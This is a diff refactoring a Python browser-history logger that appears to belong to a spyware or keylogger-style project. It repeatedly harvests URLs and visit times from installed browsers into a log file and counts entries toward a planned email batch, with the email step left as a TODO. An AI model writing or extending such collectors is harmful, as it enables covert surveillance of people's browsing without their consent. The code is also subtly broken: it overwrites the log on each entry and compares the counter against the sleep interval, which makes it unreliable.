@@ -1,39 +1,59 @@
-from browserhistory import get_browserhistory, get_username
+from browserhistory import get_browserhistory
 from utils.utils import log, handle_counter
 from config import LOGS_DIRECTORY_PATH, BROWSER_INTERVAL, BROWSER_LOGS_PER_EMAIL
 from time import sleep
-from os import _exit
+from os.path import join
+import sys
 
 
 class BrowserLogger:
     def __init__(self):
-        self.logs_directory_path = LOGS_DIRECTORY_PATH or ""
-        self.interval = BROWSER_INTERVAL
+        self.log_file_path = (
+            join(LOGS_DIRECTORY_PATH, "browser.txt")
+            if LOGS_DIRECTORY_PATH
+            else "browser.txt"
+        )
+        self.error_file_path = (
+            join(LOGS_DIRECTORY_PATH, "errors.txt")
+            if LOGS_DIRECTORY_PATH
+            else "errors.txt"
+        )
         self.counter = 0
         self.counter_max = BROWSER_LOGS_PER_EMAIL
+        self.interval = BROWSER_INTERVAL
         self.running = True
 
-    def log_browser_history(self):
+    def log_browser_history(self) -> None:
         browser_history = get_browserhistory()
-        if not browser_history:
-            return
+        if browser_history:
+            for browser, history in browser_history.items():
+                for search in history:
+                    log(
+                        f"{search[2]}: {search[1]} ({search[0]})",
+                        self.log_file_path,
+                        mode="w",
+                    )
 
-        for browser, history in browser_history.items():
-            for search in history:
-                log(f"{search[2]}: {search[1]} ({search[0]})", "browser_log.txt", False)
+    def handle_counter(self):
+        self.counter += 1
+        if handle_counter(self.counter, self.interval):
+            pass  # TODO: Email logic
 
     def run(self):
         try:
             while self.running:
                 self.log_browser_history()
-                self.counter += 1
-                if handle_counter(self.counter, self.counter_max):
-                    # email logic here
-                    pass
+                self.handle_counter()
                 sleep(self.interval)
+        except KeyboardInterrupt:
+            self.running = False
         except Exception as e:
-            log("ERROR WHILE LOGGING BROWSER:", "errors.txt")
-            log(e)
+            self.running = False
+            self.log_error("ERROR WHILE LOGGING BROWSER:", e)
+
+    def log_error(self, message: str, exception: Exception) -> None:
+        log(message, self.error_file_path)
+        log(str(exception), self.error_file_path)
 
 
 def main():
@@ -41,9 +61,9 @@ def main():
     try:
         browser_logger.run()
     except Exception:
-        print("An error occured while logging browser.")
-        print("See full error here: ")  # TODO: Add file path of error log
+        print("An error occurred while logging the browser.")
+        print(f"See full error here: {browser_logger.error_file_path}")
 
 
 if __name__ == "__main__":
-    _exit(main())
+    sys.exit(main())
